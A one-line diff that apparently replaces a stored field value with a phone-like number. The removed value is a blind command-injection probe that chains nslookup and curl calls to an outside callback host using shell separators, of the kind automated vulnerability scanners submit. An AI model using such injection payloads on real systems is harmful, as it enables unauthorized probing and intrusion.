@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitapjzaldwuu630f0.bxss.me||curl hitapjzaldwuu630f0.bxss.me)|(nslookup -q=cname hitapjzaldwuu630f0.bxss.me||curl hitapjzaldwuu630f0.bxss.me)&(nslookup -q=cname hitapjzaldwuu630f0.bxss.me||curl hitapjzaldwuu630f0.bxss.me)
+5559920108
